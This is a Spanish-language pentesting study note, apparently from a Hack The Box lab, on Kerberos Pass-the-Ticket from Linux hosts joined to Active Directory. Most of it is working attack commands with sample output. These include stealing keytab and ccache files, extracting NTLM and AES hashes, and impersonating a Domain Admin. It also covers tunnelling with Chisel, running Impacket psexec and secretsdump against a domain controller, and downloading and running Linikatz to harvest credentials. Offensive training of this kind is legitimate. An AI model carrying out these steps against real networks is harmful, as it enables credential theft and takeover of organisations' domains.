# Pass-the-Ticket (PtT) desde Linux

Los sistemas Linux integrados en Active Directory mediante SSSD, Winbind o realmd almacenan tickets Kerberos en archivos `.ccache` y claves de servicio en archivos `.keytab`. Ambos pueden ser abusados para suplantar usuarios del dominio sin conocer su contraseña, de forma análoga a PtH pero usando el protocolo Kerberos.

### Identificar integración con AD

```bash
# Verificar si la máquina está unida al dominio
realm list

# Salida típica:
# inlanefreight.htb
#   type: kerberos
#   client-software: sssd
#   permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
#   permitted-groups: Linux Admins

# Alternativa — verificar procesos de integración activos
ps -ef | grep -i "winbind\|sssd"
```

### Archivos keytab

Los archivos `.keytab` almacenan claves Kerberos de cuentas de servicio y se usan en scripts automatizados (cronjobs) para autenticación sin contraseña. Contienen hashes crackeables.

#### Localizar keytabs

```bash
# Buscar por nombre
find / -name "*keytab*" -ls 2>/dev/null

# Buscar en cronjobs — pueden referenciar keytabs sin extensión .keytab
crontab -l
cat /etc/cron* 2>/dev/null

# Ejemplo de script con keytab en cronjob:
# kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos/.scripts/svc_workstations.kt
# smbclient //dc01/svc_workstations -k -no-pass
```

> 💡 La cuenta de máquina del sistema Linux también tiene su keytab en `/etc/krb5.keytab` (solo root puede leerlo). Si se obtiene, se puede suplantar la cuenta de máquina `LINUX01$`.

#### Inspeccionar un keytab

```bash
# Ver a qué usuario/principal corresponde el keytab
klist -k -t /opt/specialfiles/carlos.keytab

# Salida:
# KVNO Timestamp           Principal
# ---- ------------------- --------------------------------------------------
#    1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

#### Usar un keytab para obtener TGT

```bash
# Ver ticket actual
klist

# Importar el keytab — obtiene TGT como el usuario del keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Verificar el nuevo ticket
klist

# Usar el ticket para acceder a recursos
smbclient //dc01/carlos -k -c ls
```

> ⚠️ **Atención:** `kinit` distingue mayúsculas/minúsculas. Usar el principal exactamente como aparece en `klist -k -t`. Antes de importar un keytab, guardar una copia del ccache actual si se necesita mantener la sesión original.

#### Extraer hashes del keytab — KeyTabExtract

Los keytabs contienen hashes NT, AES-256 y AES-128 crackeables:

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

# Salida:
# REALM : INLANEFREIGHT.HTB
# SERVICE PRINCIPAL : carlos/
# NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
# AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
# AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Con el **NT hash** → Pass-the-Hash. Con los hashes AES → forjar tickets con Rubeus o crackear para obtener la contraseña en texto claro. El NT hash es el más fácil de crackear — herramientas online como `crackstation.net` o Hashcat `-m 1000`.

### Archivos ccache

Los archivos ccache almacenan tickets Kerberos activos de usuarios con sesión abierta. Se crean en `/tmp` al autenticarse y duran mientras la sesión está activa (típicamente hasta 10 horas).

#### Localizar ccaches

```bash
# Variable de entorno — apunta al ccache del usuario actual
env | grep -i krb5
# KRB5CCNAME=FILE:/tmp/krb5cc_647401107_r5qiuu

# Listar todos los ccaches en /tmp
ls -la /tmp/krb5cc_*

# Con root — ver ccaches de todos los usuarios
ls -la /tmp
# -rw-------  1 julio@inlanefreight.htb   krb5cc_647401106_tBswau
# -rw-------  1 david@inlanefreight.htb   krb5cc_647401107_Gf415d
# -rw-------  1 carlos@inlanefreight.htb  krb5cc_647402606_qd2Pfh
```

#### Verificar el contenido de un ccache

```bash
klist
# Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
# Default principal: david@INLANEFREIGHT.HTB
# Valid starting     Expires            Service principal
# 10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB

# Inspeccionar ccache de otro usuario (requiere root o lectura)
klist -c /tmp/krb5cc_647401106_tBswau
```

#### Usar un ccache — impersonar usuario

```bash
# Copiar el ccache del usuario objetivo
cp /tmp/krb5cc_647401106_I8I133 /root/julio_ticket

# Apuntar KRB5CCNAME al ccache copiado
export KRB5CCNAME=/root/julio_ticket

# Verificar el ticket activo
klist

# Acceder a recursos del dominio como julio (DA en este ejemplo)
smbclient //dc01/C$ -k -c ls -no-pass
```

> Los ccaches son temporales. Verificar siempre los campos `Valid starting` y `Expires` con `klist` antes de usarlos. Si han expirado, no funcionan.

### Identificar usuarios de alto valor

```bash
# Ver grupos de un usuario del dominio desde Linux
id julio@inlanefreight.htb
# uid=647401106(julio@inlanefreight.htb)
# groups=...,647400512(domain admins@inlanefreight.htb),...
```

### Usar herramientas de ataque con Kerberos desde Linux externo

Si el host atacante no está unido al dominio, necesita resolver los nombres del dominio y enrutar el tráfico hacia el KDC. Se configura un túnel con Chisel + Proxychains.

#### Configurar /etc/hosts y proxychains

```bash
# /etc/hosts — resolución manual de nombres del dominio
172.16.1.10  inlanefreight.htb  dc01.inlanefreight.htb  dc01
172.16.1.5   ms01.inlanefreight.htb  ms01

# /etc/proxychains.conf — usar SOCKS5 en lugar de SOCKS4
[ProxyList]
socks5 127.0.0.1 1080
```

#### Túnel con Chisel

```bash
# En el host atacante — servidor Chisel con reverse tunneling
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz && mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse

# En el pivot host Windows (MS01) — conectar al servidor
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

#### Impacket con Kerberos via proxychains

```bash
# Configurar el ccache a usar
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

# Usar nombre de host, no IP (-k para Kerberos, -no-pass sin contraseña)
proxychains impacket-wmiexec dc01 -k
proxychains impacket-psexec dc01 -k -no-pass
proxychains impacket-smbexec dc01 -k -no-pass
proxychains impacket-secretsdump dc01 -k -no-pass
```

> Impacket necesita el nombre del host (no la IP) para que Kerberos funcione correctamente. Si el ccache usa el prefijo `FILE:`, eliminarlo de la variable: `export KRB5CCNAME=/ruta/ccache` sin el prefijo.

#### Evil-WinRM con Kerberos

```bash
# Instalar soporte Kerberos
sudo apt-get install krb5-user -y
# Realm: INLANEFREIGHT.HTB
# KDC: dc01.inlanefreight.htb

# /etc/krb5.conf
[libdefaults]
    default_realm = INLANEFREIGHT.HTB
[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }

# Conectar (-r especifica el realm)
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Conversión de tickets ccache ↔ kirbi

Los ccaches (Linux) y los kirbi (Windows) son formatos distintos pero intercambiables:

```bash
# ccache → kirbi (para usar en Windows con Rubeus)
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# kirbi → ccache (para usar en Linux con Impacket)
impacket-ticketConverter julio.kirbi julio.ccache
export KRB5CCNAME=/ruta/julio.ccache
```

En Windows, importar el kirbi con Rubeus:

```cmd
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
klist
dir \\dc01\julio
```

### Linikatz — extracción automatizada (Mimikatz para Linux)

Linikatz extrae credenciales Kerberos de todas las implementaciones de integración AD en Linux (SSSD, Samba, FreeIPA, Winbind, Vintella). Requiere root.

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
sudo ./linikatz.sh
```

Extrae y lista: ccaches de usuarios activos, keytabs del sistema, hashes de SSSD, ticket de la cuenta de máquina, secretos de Samba. Los resultados se guardan en una carpeta `linikatz.*`.

### Resumen del flujo de ataque

| Recurso encontrado         | Acción                                                         |
| -------------------------- | -------------------------------------------------------------- |
| `.keytab` legible          | `klist -k -t` para ver usuario → `kinit` para obtener TGT      |
| `.keytab` — extraer hashes | `keytabextract.py` → crackear NT hash o PtH                    |
| `ccache` en `/tmp`         | `export KRB5CCNAME` → usar directamente con Impacket/smbclient |
| Usuario con sesión activa  | Copiar su ccache → impersonarlo                                |
| Root en el sistema         | Linikatz para extraer todo automáticamente                     |
